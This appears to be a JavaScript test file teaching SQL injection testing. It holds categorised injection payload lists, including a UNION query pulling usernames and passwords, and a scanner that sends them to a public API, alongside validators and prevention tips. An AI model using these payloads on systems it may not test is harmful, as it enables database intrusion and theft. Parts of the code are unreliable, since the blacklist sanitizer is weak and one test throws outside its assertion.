/**
 * EDUCATIONAL HACKING TUTORIALS
 * Module 1: Web Application Security
 * Tutorial 1: SQL Injection Testing
 * 
 * ⚠️ EDUCATIONAL PURPOSE ONLY - For Security Testing and Learning
 * 
 * Learning Objectives:
 * - Understand SQL injection vulnerabilities
 * - Test for SQL injection in API endpoints
 * - Implement proper input validation
 * - Learn defensive coding practices
 */

import { expect } from "chai";
import supertest from "supertest";

console.log("=== SQL INJECTION TESTING TUTORIAL ===");
console.log("⚠️  FOR EDUCATIONAL AND SECURITY TESTING PURPOSES ONLY");

/**
 * STEP 1: Understanding SQL Injection
 * 
 * SQL Injection occurs when user input is directly concatenated into SQL queries
 * without proper sanitization. This allows attackers to manipulate database queries.
 * 
 * Example vulnerable code:
 *   const query = `SELECT * FROM users WHERE id = ${userId}`;
 * 
 * If userId = "1 OR 1=1", the query becomes:
 *   SELECT * FROM users WHERE id = 1 OR 1=1
 * 
 * This would return all users!
 */

// SQL Injection Test Payloads
class SQLInjectionPayloads {
  static getBasicPayloads() {
    return [
      "' OR '1'='1",
      "' OR '1'='1' --",
      "' OR '1'='1' /*",
      "1' OR '1'='1",
      "1' OR '1'='1' --",
      "admin'--",
      "admin'/*",
      "' OR 1=1--",
      "' OR 1=1#",
      "' OR 1=1/*",
      "') OR ('1'='1",
      "1' OR '1'='1",
      "1' OR '1'='1'--",
      "1' OR '1'='1'/*"
    ];
  }
  
  static getUnionBasedPayloads() {
    return [
      "' UNION SELECT NULL--",
      "' UNION SELECT NULL,NULL--",
      "' UNION SELECT NULL,NULL,NULL--",
      "1' UNION SELECT 1,2,3--",
      "' UNION SELECT username,password FROM users--"
    ];
  }
  
  static getTimeBasedPayloads() {
    return [
      "'; WAITFOR DELAY '00:00:05'--",
      "'; SELECT SLEEP(5)--",
      "1'; SELECT pg_sleep(5)--",
      "'; SELECT SLEEP(5)#"
    ];
  }
  
  static getErrorBasedPayloads() {
    return [
      "'",
      "''",
      "`",
      "``",
      ",",
      "\"",
      "\"\"",
      "/",
      "//",
      "\\",
      "\\\\",
      ";",
      "' or \"",
      "-- or #",
      "' OR '1",
      "' OR 1 -- -",
      "\" OR \"\" = \"",
      "\" OR 1 = 1 -- -",
      "' OR '' = '",
      "'='",
      "'LIKE'",
      "'=0--+",
      " OR 1=1",
      "' OR 'x'='x",
      "' AND id IS NULL; --",
      "'''''''''''''UNION SELECT '2"
    ];
  }
  
  static getBlindSQLPayloads() {
    return [
      "' AND 1=1--",
      "' AND 1=2--",
      "' AND 'a'='a",
      "' AND 'a'='b",
      "1' AND '1'='1",
      "1' AND '1'='2",
      "' OR 1=1",
      "' OR 1=2"
    ];
  }
}

// SQL Injection Tester
class SQLInjectionTester {
  constructor(baseUrl) {
    this.client = supertest(baseUrl);
    this.results = [];
  }
  
  async testParameter(parameter, value, payload) {
    try {
      const response = await this.client
        .get("/api/users")
        .query({ [parameter]: payload });
      
      return {
        parameter,
        payload,
        status: response.status,
        responseTime: response.responseTime,
        body: response.body,
        vulnerable: this.detectVulnerability(response, payload)
      };
    } catch (error) {
      return {
        parameter,
        payload,
        error: error.message,
        vulnerable: false
      };
    }
  }
  
  detectVulnerability(response, payload) {
    const indicators = [
      // Error messages
      /SQL syntax/i,
      /mysql/i,
      /postgresql/i,
      /oracle/i,
      /sql server/i,
      /syntax error/i,
      /unclosed quotation/i,
      /quoted string/i,
      
      // Time-based detection
      response.responseTime > 5000, // If response took more than 5 seconds
      
      // Response content
      /union/i.test(JSON.stringify(response.body)),
      /select/i.test(JSON.stringify(response.body)),
      
      // Status code anomalies
      response.status === 500,
      response.status === 200 && response.body.length === 0
    ];
    
    return indicators.some(indicator => {
      if (typeof indicator === 'boolean') {
        return indicator;
      }
      if (indicator instanceof RegExp) {
        return indicator.test(JSON.stringify(response.body)) ||
               indicator.test(JSON.stringify(response.headers));
      }
      return false;
    });
  }
  
  async testEndpoint(endpoint, method = 'GET', payloads) {
    const results = [];
    
    for (const payload of payloads) {
      try {
        let response;
        
        if (method === 'GET') {
          response = await this.client
            .get(endpoint)
            .query({ id: payload });
        } else if (method === 'POST') {
          response = await this.client
            .post(endpoint)
            .send({ id: payload });
        }
        
        const result = {
          endpoint,
          method,
          payload,
          status: response.status,
          vulnerable: this.detectVulnerability(response, payload),
          responseTime: response.responseTime
        };
        
        results.push(result);
        
        if (result.vulnerable) {
          console.warn(`⚠️  Potential SQL Injection found!`);
          console.warn(`   Endpoint: ${endpoint}`);
          console.warn(`   Payload: ${payload}`);
        }
      } catch (error) {
        results.push({
          endpoint,
          method,
          payload,
          error: error.message,
          vulnerable: false
        });
      }
    }
    
    return results;
  }
}

// Defensive Coding Examples
class SecureInputValidator {
  static sanitizeString(input) {
    if (typeof input !== 'string') {
      return String(input);
    }
    
    // Remove SQL injection patterns
    return input
      .replace(/'/g, "''") // Escape single quotes
      .replace(/;/g, '') // Remove semicolons
      .replace(/--/g, '') // Remove comment markers
      .replace(/\/\*/g, '') // Remove block comment start
      .replace(/\*\//g, '') // Remove block comment end
      .trim();
  }
  
  static validateInteger(input) {
    const num = parseInt(input, 10);
    if (isNaN(num) || !Number.isInteger(num)) {
      throw new Error("Invalid integer input");
    }
    return num;
  }
  
  static validateEmail(input) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(input)) {
      throw new Error("Invalid email format");
    }
    return input;
  }
  
  static useParameterizedQuery(query, params) {
    // Example of parameterized query (pseudo-code)
    // In real implementation, use prepared statements
    // const query = "SELECT * FROM users WHERE id = ?";
    // const result = db.query(query, [userId]);
    return { query, params };
  }
}

// Exercises and Tests
describe("SQL Injection Testing Tutorial", () => {
  let tester;
  let payloads;
  
  beforeEach(() => {
    // Using a test API - in real scenario, test your own application
    tester = new SQLInjectionTester("https://jsonplaceholder.typicode.com");
    payloads = SQLInjectionPayloads.getBasicPayloads();
  });
  
  it("STEP 1: Should understand basic SQL injection payloads", () => {
    const basicPayloads = SQLInjectionPayloads.getBasicPayloads();
    
    expect(basicPayloads.length).to.be.greaterThan(0);
    expect(basicPayloads).to.include("' OR '1'='1");
    expect(basicPayloads).to.include("' OR '1'='1' --");
    
    console.log("✓ Basic payloads loaded:", basicPayloads.length);
  });
  
  it("STEP 2: Should test for SQL injection in query parameters", async () => {
    // This is a demonstration - jsonplaceholder doesn't have SQL injection
    // In real testing, use your own vulnerable application
    
    const results = await tester.testEndpoint(
      "/posts",
      "GET",
      payloads.slice(0, 3) // Test first 3 payloads
    );
    
    expect(results.length).to.equal(3);
    results.forEach(result => {
      expect(result).to.have.property('payload');
      expect(result).to.have.property('vulnerable');
    });
    
    console.log("✓ SQL injection testing completed");
  });
  
  it("STEP 3: Should understand input sanitization", () => {
    const maliciousInput = "1' OR '1'='1";
    const sanitized = SecureInputValidator.sanitizeString(maliciousInput);
    
    expect(sanitized).to.not.equal(maliciousInput);
    expect(sanitized).to.not.include("' OR '1'='1");
    
    console.log("✓ Input sanitization working");
    console.log(`  Original: ${maliciousInput}`);
    console.log(`  Sanitized: ${sanitized}`);
  });
  
  it("STEP 4: Should validate integer inputs", () => {
    expect(() => {
      SecureInputValidator.validateInteger("123");
    }).to.not.throw();
    
    expect(() => {
      SecureInputValidator.validateInteger("1' OR '1'='1");
    }).to.throw("Invalid integer input");
    
    expect(() => {
      SecureInputValidator.validateInteger("abc");
    }).to.throw("Invalid integer input");
    
    console.log("✓ Integer validation working");
  });
  
  it("STEP 5: Should understand parameterized queries", () => {
    const userId = "1' OR '1'='1";
    const result = SecureInputValidator.useParameterizedQuery(
      "SELECT * FROM users WHERE id = ?",
      [userId]
    );
    
    expect(result.query).to.include("?");
    expect(result.params).to.include(userId);
    
    // In real implementation, the database driver would safely handle the parameter
    console.log("✓ Parameterized query concept understood");
  });
});

// Best Practices Guide
describe("SQL Injection Prevention Best Practices", () => {
  it("PRACTICE 1: Always use parameterized queries", () => {
    // ❌ BAD: String concatenation
    // const query = `SELECT * FROM users WHERE id = ${userId}`;
    
    // ✅ GOOD: Parameterized query
    // const query = "SELECT * FROM users WHERE id = ?";
    // const result = db.query(query, [userId]);
    
    console.log("✓ Best Practice 1: Use parameterized queries");
  });
  
  it("PRACTICE 2: Validate and sanitize all inputs", () => {
    const userInput = "1' OR '1'='1";
    
    // Validate type
    const validated = SecureInputValidator.validateInteger(userInput);
    
    // This should throw an error for malicious input
    expect(() => {
      SecureInputValidator.validateInteger(userInput);
    }).to.throw();
    
    console.log("✓ Best Practice 2: Validate all inputs");
  });
  
  it("PRACTICE 3: Use least privilege database accounts", () => {
    // Database user should only have necessary permissions
    // Don't use root/admin accounts for application connections
    
    console.log("✓ Best Practice 3: Use least privilege");
  });
  
  it("PRACTICE 4: Implement input whitelisting", () => {
    const allowedValues = ["active", "inactive", "pending"];
    const userInput = "active";
    
    if (!allowedValues.includes(userInput)) {
      throw new Error("Invalid input value");
    }
    
    expect(allowedValues).to.include(userInput);
    console.log("✓ Best Practice 4: Use whitelisting");
  });
  
  it("PRACTICE 5: Regular security testing", () => {
    // Regularly test your application for SQL injection vulnerabilities
    // Use automated tools and manual testing
    // Keep security testing in your CI/CD pipeline
    
    console.log("✓ Best Practice 5: Regular security testing");
  });
});

// Reporting
class SecurityTestReport {
  constructor() {
    this.vulnerabilities = [];
    this.testsRun = 0;
    this.testsPassed = 0;
    this.testsFailed = 0;
  }
  
  addVulnerability(vulnerability) {
    this.vulnerabilities.push({
      ...vulnerability,
      timestamp: new Date().toISOString(),
      severity: this.calculateSeverity(vulnerability)
    });
  }
  
  calculateSeverity(vulnerability) {
    if (vulnerability.vulnerable) {
      return "HIGH";
    }
    return "LOW";
  }
  
  generateReport() {
    return {
      summary: {
        totalTests: this.testsRun,
        passed: this.testsPassed,
        failed: this.testsFailed,
        vulnerabilitiesFound: this.vulnerabilities.length
      },
      vulnerabilities: this.vulnerabilities,
      recommendations: this.getRecommendations()
    };
  }
  
  getRecommendations() {
    return [
      "Implement parameterized queries",
      "Validate and sanitize all user inputs",
      "Use prepared statements",
      "Implement input whitelisting",
      "Regular security audits",
      "Use Web Application Firewall (WAF)",
      "Keep database software updated",
      "Implement proper error handling (don't expose SQL errors)"
    ];
  }
}

// Final Test Suite
describe("Complete SQL Injection Test Suite", () => {
  it("should run comprehensive SQL injection tests", async () => {
    const report = new SecurityTestReport();
    const tester = new SQLInjectionTester("https://jsonplaceholder.typicode.com");
    
    const payloads = [
      ...SQLInjectionPayloads.getBasicPayloads().slice(0, 5),
      ...SQLInjectionPayloads.getErrorBasedPayloads().slice(0, 3)
    ];
    
    for (const payload of payloads) {
      report.testsRun++;
      
      try {
        const result = await tester.testEndpoint("/posts", "GET", [payload]);
        
        if (result[0] && result[0].vulnerable) {
          report.addVulnerability(result[0]);
          report.testsFailed++;
        } else {
          report.testsPassed++;
        }
      } catch (error) {
        report.testsFailed++;
      }
    }
    
    const finalReport = report.generateReport();
    
    expect(finalReport.summary.totalTests).to.be.greaterThan(0);
    expect(finalReport.recommendations.length).to.be.greaterThan(0);
    
    console.log("\n=== SECURITY TEST REPORT ===");
    console.log(JSON.stringify(finalReport, null, 2));
  });
});

export { 
  SQLInjectionPayloads,
  SQLInjectionTester,
  SecureInputValidator,
  SecurityTestReport
};

